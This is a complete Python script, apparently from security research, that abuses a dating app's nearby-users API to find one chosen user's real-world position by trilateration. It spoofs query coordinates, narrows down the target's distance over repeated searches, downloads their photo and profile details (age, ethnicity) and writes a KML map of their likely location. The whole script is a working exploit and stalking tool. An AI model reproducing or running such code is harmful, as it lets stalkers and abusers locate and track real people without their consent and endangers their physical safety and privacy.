#!/usr/bin/env python

# Summary: This scripts gather data from the "XXXXX" dating app around some coordinates or city
#          Then, it uses the information gathered to geolocate the user using trilateration.
# Author: Felipe Molina (@felmoltor)
# Date: 2021-02

# General libraries
import os,sys
from pathlib import Path
import csv
from optparse import OptionParser
import math
from time import sleep
from random import randint,uniform
import matplotlib.pyplot as plt
import json
import requests
from requests.auth import HTTPBasicAuth
from datetime import datetime
import urllib3
urllib3.disable_warnings()
import re
from ColorMessages import *
# Geographic Libraries
from geopy.geocoders import Nominatim
from shapely import geometry
import pyproj
import utm
from shapely.geometry import LineString
import simplekml
from polycircles import polycircles

# To login we have to POST to the following URL:
N_RESULTS=100 # This is the number of restuls we are requesting to the server
REC_LOGIN="https://anotherdatingapp.api.com/Sessions/Authenticate"
REC_GET_GEONEARBY="https://anotherdatingapp.api.com/Helpers/ProfileList/Nearby?latitude=<LAT>&longitude=<LONG>&skip=0&take=%s" % N_RESULTS
REC_GET_USERINFO="https://anotherdatingapp.api.com/Profile/<USER_ID>"
FAKE_OFFSET=0 # originally was 70 meters
# To be sure that we are not going to receive the dummy distance of 300 meters from the AUT servers
# We add aproximately 333 meters to the east to our chosen point.
# We use the aproximations proposed on this page: https://www.usna.edu/Users/oceano/pguth/md_help/html/approx_equivalents.htm
# 1° = 111 km
# 0.001° = 111 m
# 0.003° = 333 m
# 0.003° = 444 m
SKEWED_DEGREES=0.003
GIVEUP_ATTEMPTS=8
MOVE_PROBE_ATTEMPTS=3
USER_AGENT="AnotherDatingApp/2240300 (Android 6.0.1; MI 5s)"
COOLDOWN=5         # Cooldown time (in seconds) before asking Telegram again for the same username
FOUND_COOLDOWN=5   # Cooldown time (in seconds) before asking Telegram for a new geo position around the target username
COOLDOWN_BASE=5
MAX_COOLDOWN=400
OK_THRESHOLD=10     # Distance to stop querying Telegram for the target user
CIRCLE_RESOLUTION=180
TARGET_FILE="data/anotherdatingapp-target.csv"
TRACKING_FILE="data/anotherdatingapp-tracking.csv"
GOOGLE_EARTH_PATH="/usr/bin/google-earth-pro"

class AnotherDatingAppUser():
    def __init__(self):        
        self.id=None
        self.name=None
        self.aboutme=None
        self.online=None
        self.distance=None
        self.ethnicity=None
        self.hair=None
        self.role=None
        self.age=None
        self.location=None
        self.photo_path=None
        self.photo_dimensions=None
        self.latitude=None
        self.longitude=None
        self.from_point=None
        self.distance=None
        self.found=False

def get_options():
    parser = OptionParser()
    parser.add_option("-u", "--username", dest="username",
                    help="Login username", default=None)
    parser.add_option("-p", "--password", dest="password",
                    help="Password", default=None)
    parser.add_option("-l", "--lat", dest="latitude",
                    help="Latitude of your coordinates", default=None)
    parser.add_option("-L", "--long", dest="longitude",
                    help="Longitude of your coordinates", default=None)
    parser.add_option("-c", "--city", dest="city",
                    help="City name or address where you want to locate the user", default=None)
    parser.add_option("-t", "--target", dest="target",
                    help="Target Tagged ID number", default=None)
    parser.add_option("-o", "--output", dest="output",
                    help="Output file name", default="data/coordinates.csv")
    parser.add_option("-k", "--kml", dest="kml",
                    help="Output KML path", default="output/target.kml")
    parser.add_option("-P", "--proxy", dest="proxy",
                    help="Proxy to send the requests through (default: None)", default=None)
    parser.add_option("-q", "--quiet",
                    action="store_false", dest="verbose", default=True,
                    help="don't print status messages to stdout")

    (options, args) = parser.parse_args()
    return options

# Formula extracted from https://stackoverflow.com/questions/7477003/calculating-new-longitude-latitude-from-old-n-meters
# If we get to close to the poles ir radius is very big, this will fail
def getPerimeterPoint(center,dx,dy):
    r_earth = 6378000 # 6378 Km of radius = 6378000 metres
    # Number of Km per degree of longitude
    # (2*math.pi/360) * r_earth * cos(point.latitude)
    # Number of Km per degree of latitude
    # ((2*math.pi)/360) * r_earth = 111 km / degree 
    new_latitude  = center.y  + (dy / r_earth) * (180.0 / math.pi)
    new_longitude = center.x + (dx / r_earth) * (180.0 / math.pi) / math.cos(center.y * math.pi/180.0)
    return geometry.Point(new_latitude,new_longitude)

# This function will return the poligon drawing the circle around the center point with a radius of r
def getCirclePoints(center,radius,resolution=180):
    perimeter_points=[]
    # Iterate through the number of points around the center
    for n in range(1,resolution+1):
        # Divide the 360 degrees of a circle in "resolution" samples
        degree=n*(360.0/resolution)
        dx=math.cos(math.radians(degree))*radius
        dy=math.sin(math.radians(degree))*radius
        ppoint=(getPerimeterPoint(center,dx,dy))
        perimeter_points.append(ppoint)
    
    poly = geometry.Polygon([[p.x, p.y] for p in perimeter_points])
    return poly

def getCityCoordinates(city):
    try:
        nom = Nominatim(user_agent=USER_AGENT)
        n = nom.geocode(city)
        return n.point
    except Exception as e:
        print(e)
        return None

# TODO: Funny (and dangerously enough), you dont really need to authenticate to get geo data from their servers
def login(username,password,session):
    login_data={
        "Email":username,
        "GmtOffset":60.0,
        "InstallationId":"d37fc2f0-2f6f-4e8d-94a3-8986106e9d76",
        "Password":password,
        "UserAgent":USER_AGENT
    }
    login_res=session.post(REC_LOGIN,data=login_data)
    if (login_res.status_code == 200):
        # Get the session cookie from the resulting JSON
        js=json.loads(login_res.text)
        bearer_token="Bearer %s" % js["Token"]
        session.headers.update({"Authorization":bearer_token})
        return True
    else:
        return False


def getAnotherDatingAppUserData(target_id,session):
    user=None

    URL=REC_GET_USERINFO.replace("<USER_ID>",str(target_id))
    user_resp=session.get(URL)

    if (user_resp.status_code==200):
        user=AnotherDatingAppUser()
        # fill the data of the user variable
        js=json.loads(user_resp.text)
        
        user.id=js["Id"]
        user.name=js["Name"]
        user.aboutme=js["AboutMe"]
        user.online=js["Online"]
        user.distance=js["Distance"]
        user.ethnicity=js["Ethnicity"]
        user.hair=js["Hair"]
        user.role=js["Role"]
        user.age=js["Age"]
        user.location=js["Location"]
        user.photo_url=js["ProfileImages"][0]["Url"]
        user.photo_dimensions=js["ProfileImages"][0]["Dimensions"]
        user.latitude=None
        user.longitude=None
        user.from_point=None
        user.found=False
        user.photo_path=None # path in our local hard drive
        
        # Download user photo
        rnd=randint(1000,9999)
        fname=Path("images/anotherdatingapp/%s_%s_%s.jpg" % (user.name,user.id,rnd)).absolute()
        photo_resp=session.get(user.photo_url,stream=True)
        if (photo_resp.status_code==200):
            with open(fname, 'wb') as f:
                f.write(photo_resp.content)
            user.photo_path=fname

    return user

def getAnotherDatingAppNearbyPeople(user,center,session):
    # Request list of people "around you"
    # Swap wildcards with actual lat and long parameters
    get_nearby_url=REC_GET_GEONEARBY.replace("<LAT>",str(center.y))
    get_nearby_url=get_nearby_url.replace("<LONG>",str(center.x))
    people_resp=session.get(get_nearby_url)
    if (people_resp.status_code==200):
        json_resp=json.loads(people_resp.text)
        for r in json_resp:
            if (r["Id"]==user.id):
                # Transform to meters and substract the fake offset AUT is adding to all distances
                user.distance=(float(r["Distance"]))  # This is meters
                user.found=True  
                user.from_point=center      
                break      
    else:
        error("Error retrieving list of people nearby (%s)" % people_resp.status_code)
    
    return user

def saveTargetData(target):
    now_epoch=int(datetime.now().timestamp())
    with open(TARGET_FILE,"a") as out:
        csvwriter=csv.writer(out,delimiter=",")
        data_array=(now_epoch,target.from_point.y,target.from_point.x,target.distance,target.id,target.name,target.age)
        csvwriter.writerow(data_array)

def drawTargetKml(kml_file,target,potential_location,open_kml=True):
    kml=simplekml.Kml()
    with open(TARGET_FILE,"r") as csv_file:
        csv_reader = csv.reader(csv_file, delimiter=',')

        measure_n=0
        for row in csv_reader:
            measure_n+=1
        
            lat=float(row[1])
            lon=float(row[2])
            distance=float(row[3])
            user_id=row[4]
            username=row[5]
            label="%s (%s)" % (username,user_id)
            
            # Safe check, radious have to be a positive value, not 0
            r=distance
            if (distance==0):
                r=0.1

            polycircle = polycircles.Polycircle(latitude=lat,
                                        longitude=lon,
                                        radius=r,
                                        number_of_vertices=CIRCLE_RESOLUTION)
            
            pol = kml.newpolygon(name="[%s] Distance to %s (%s)" % (measure_n,username,user_id),outerboundaryis=polycircle.to_kml())
            pol.style.polystyle.color = simplekml.Color.changealphaint(100, simplekml.Color.green)
    if (potential_location is not None):
        point_name="%s (%s)" % (username,user_id)
        target_point=kml.newpoint(name=point_name)
        target_point.coords=[(potential_location.x,potential_location.y)]
        target_point.description='%s (%s)<br/><img src="%s" alt="Target Photo" align="left" width=150 height=250 />' % (target.name,target.id,str(target.photo_path))
    else:
        error("Couln't find a potential location of the target user. Skipping the point creation in the KML map.")
    
    kml.save(kml_file)

    # If open is true, open with Google Earth
    if (open_kml):
        if (os.path.exists(GOOGLE_EARTH_PATH)):
            os.system('xdg-open %s' % kml_file)
        else:
            print("Google Earth path not found. Open the file '%s' manually to see the location of the target.")

# This function return the a different cooldown time for each iteration following the exponential backoff retry
def get_cooldown(n):
    return min(MAX_COOLDOWN,COOLDOWN_BASE*(math.pow(2,n-1)))

# This loop is to be repeated every time we search a user around a point
def searchUserAround(user,init_point,session,last_success_distance=None):
    potential_location=None
    user.found=False
    user.from_point=None
    user.distance=None
    current_point=init_point
    force_move_probe=False
    giveup=False

    while (((user is not None and not user.found) or force_move_probe) and not giveup):
        user.found=False
        user.from_point=None
        user.distance=None
        force_move_probe=False

        # Iterate until the target user is found on the peer list
        missed_hits=0 # This will control how many times did we fail to locate a user on a geo position
        while (not user.found and not giveup):
            missed_hits+=1
            c=get_cooldown(missed_hits)

            # This function will return a user instance
            user=getAnotherDatingAppNearbyPeople(user,current_point,session)
            if (user.found):
                # We are very close the the target, so we consider it located
                if (user.distance <= OK_THRESHOLD):
                    success("User %s (%s) was sucessfully located %s meters away from %s,%s." % (user.id,user.name,user.distance,user.from_point.y,user.from_point.x))
                    if (potential_location is None): # We only want to save the first time that we find the mark of 300 meters
                        potential_location=current_point # Save this as the potential location of our target
                
                # If we get very close to the target, sometimes the server answers with the same distance as the last interaction
                # To rule out false positives, we repeat the search, but this time moving our probe a few meters away from here
                elif (last_success_distance is not None and user.distance == last_success_distance):
                    info("We received the same distance to the target as in the last iteration (%s m), this mean we got closer than 10 meters to it." % user.distance)
                    info("Moving the search point %s degrees away from here." % SKEWED_DEGREES)
                    force_move_probe=True 
                    # Round up the new center to only 6 decimal (the same number of decimals given by the legitimate app)
                    current_point=geometry.Point(round((current_point.x)+SKEWED_DEGREES,6),round(current_point.y,6)) # X (longitude) is in position 1, Y (latitude) is in position 0
                    info("Moving the probe to %s,%s" % (current_point.y,current_point.x))
                
                else:
                    info("User %s (%s) is %s meters away from %s,%s." % (user.id,user.name,user.distance,user.from_point.y,user.from_point.x))

                info("Waiting %s seconds to continue." % c)
                sleep(c)
            else:
                error("User not found. Waiting %s seconds to try again." % c)
                sleep(c)
                if (missed_hits>=GIVEUP_ATTEMPTS):
                    error("More than %s missed hits. Giving up in searching the user." % GIVEUP_ATTEMPTS)
                    giveup=True
                elif (missed_hits>=MOVE_PROBE_ATTEMPTS):
                    info("More than %s missed hits. Moving the probing point randomly" % MOVE_PROBE_ATTEMPTS)
                    # Move the probe to a random position
                    force_move_probe=True
                    rnd_x=uniform(0.0,SKEWED_DEGREES)
                    rnd_y=uniform(0.0,SKEWED_DEGREES)
                    if(randint(0,1)):
                        rnd_x=-rnd_x
                    if(randint(0,1)):
                        rnd_y=-rnd_y
                    current_point=geometry.Point(round((current_point.x)+rnd_x,6),round(current_point.y+rnd_y,6)) # X (longitude) is in position 1, Y (latitude) is in position 0
                    info("Moving the probe to %s,%s" % (current_point.y,current_point.x)) # Error. We dont move the prove here
    
    # Return the point and the user variable updated
    return current_point,user,potential_location

################

if __name__ == "__main__":
    # Parsing options
    options=get_options()
    init_point=None
    if (options.city is not None):
        p=getCityCoordinates(options.city)
        if (p is not None):
            init_point=geometry.Point([float(p.longitude),float(p.latitude)])
        else:
            error("Error accessing GeoPy API. Try using latitude and longitude (-l and -L flags)")
            sys.exit()
    elif (options.latitude is not None and options.longitude is not None):
        # Coordinates
        init_point=geometry.Point([float(options.longitude),float(options.latitude)]) # x,y
    else:
        error("Error. You have to specify at least an address/city (-c) or coordinates (-l and -L).")

    if (init_point is None):
        error("No init point was set. Aborting.")
        exit(1)
    else:
        # Delete old targets data
        if (os.path.exists(TARGET_FILE)):
            os.remove(TARGET_FILE)
        
        # Set up requests library session
        session = requests.Session()
        session.headers.update({'User-Agent': USER_AGENT})
        session.headers.update({'X-DeviceType': "AndroidPlay"})
        session.headers.update({'X-AppVersion': "2240300"})
        session.verify = False
        # If proxy is specified
        if (options.proxy is not None):
            m = re.match("https?:\/\/([^:]*):(\d{1,4})?\/?",options.proxy)
            if (m is not None):
                proxies = {
                    'http': options.proxy,
                    'https': options.proxy,
                }
                session.proxies.update(proxies)
            else:
                error("Specified proxy does not follow the pattern http(s)://ip:port/. Ignoring it.")
        
        # Login
        if (login(options.username,options.password,session)):
            success("Sucessfully logged in with user %s" % options.username)
        else:
            error("There was an error login in. Try again with valid credentials")
            exit(1)

        # Requests user ID data
        user=getAnotherDatingAppUserData(options.target,session)

        info("#1 Searching for user id '%s' (%s) around location %s,%s" % (options.target,user.name,init_point.y,init_point.x))

        ###########################
        #      User search #1     #
        ###########################
        resulting_point,user,pl=searchUserAround(user,init_point,session)
        
        # We have found the target username
        # Now, calculate a new coordinate point on the perimeter of the circle to ask Telegram API
        first_circle=getCirclePoints(resulting_point,user.distance,resolution=CIRCLE_RESOLUTION)
        # Save data into the target file
        saveTargetData(user)

        # Pick a random point of the perimeter
        r = randint(0,CIRCLE_RESOLUTION)
        random_point=first_circle.exterior.coords[r]
        new_center=geometry.Point(round(random_point[1],6),round(random_point[0],6)) # X (longitude) is in position 1, Y (latitude) is in position 0
        
        ###########################
        #      User search #2     #
        ###########################
        info("#2 Searching for user id '%s' (%s) around location %s,%s" % (options.target,user.name,new_center.y,new_center.x))
        resulting_point,user,pl=searchUserAround(user,new_center,session,last_success_distance=user.distance)
            
        # We have found the target username for the second time
        # Now, intersect this circle with the previous one
        second_circle=getCirclePoints(user.from_point,user.distance,resolution=CIRCLE_RESOLUTION)
        # Save data into the target file
        saveTargetData(user)

        # Intersect first and secod circles and choose randomly between one of the two points of the intersection
        # https://gis.stackexchange.com/questions/318325/intersection-function-returns-multiple-coordinates
        third_center = None
        third_circle = None 
        fourth_center = None
        third_center = None
        chosen_point=None
        discarded_point=None
        if (first_circle.intersects(second_circle)):
            circle1_points=LineString(list(first_circle.exterior.coords))
            circle2_points=LineString(list(second_circle.exterior.coords))
            inter=circle1_points.intersection(circle2_points)
            # Choose between two intersection points randomly to ask again to Telegram
            cp=randint(0,1) # Chosen random point
            dp=(cp-1)%2     # Discarded point
            chosen_point=inter[cp] 
            discarded_point=inter[dp]
            third_center=geometry.Point(round(chosen_point.y,6),round(chosen_point.x,6)) # intersection returns the point coordinates switched
            fourth_center=geometry.Point(round(discarded_point.y,6),round(discarded_point.x,6)) # intersection returns the point coordinates switched
        else:
            print("Error. Circles don't intersect. Maybe the target has moved?")

        ###########################
        #      User search #3     #
        ###########################
        info("#3 Searching for user id '%s' (%s) around location %s,%s" % (options.target,user.name,third_center.y,third_center.x))
        resulting_point,user,pl=searchUserAround(user,third_center,session,last_success_distance=user.distance)
        potential_location=pl
            
        # We have found the target username for the third time
        # Now, intersect this circle with the previous one
        third_circle=getCirclePoints(user.from_point,user.distance,resolution=CIRCLE_RESOLUTION)
        # Save data into the target file
        saveTargetData(user)

        ###########################
        #      User search #4     #
        ###########################
        info("#4 Searching for user id '%s' (%s) around location %s,%s" % (options.target,user.name,fourth_center.y,fourth_center.x))
        resulting_point,user,pl=searchUserAround(user,fourth_center,session,last_success_distance=user.distance)
        # Save this as the potential location only if we haven't find the third center already as the potential location
        if (potential_location is None):
            potential_location=pl
            
        # We have found the target username for the third time
        # Now, intersect this circle with the previous one
        fourth_circle=getCirclePoints(user.from_point,user.distance,resolution=CIRCLE_RESOLUTION)
        # Save data into the target file
        saveTargetData(user)

        # Draw circle 1, 2, 3 and 4
        (x,y)=first_circle.exterior.xy
        (x2,y2)=second_circle.exterior.xy
        (x3,y3)=third_circle.exterior.xy
        (x4,y4)=fourth_circle.exterior.xy
        plt.plot(y,x)
        plt.plot(y2,x2)
        plt.plot(y3,x3)
        plt.plot(y4,x4)
        plt.ylabel="Latitude"
        plt.xlabel="Longitude"
        plt.show()
        
        print("Generating the result KML file")
        drawTargetKml(options.kml,user,potential_location,open_kml=True)

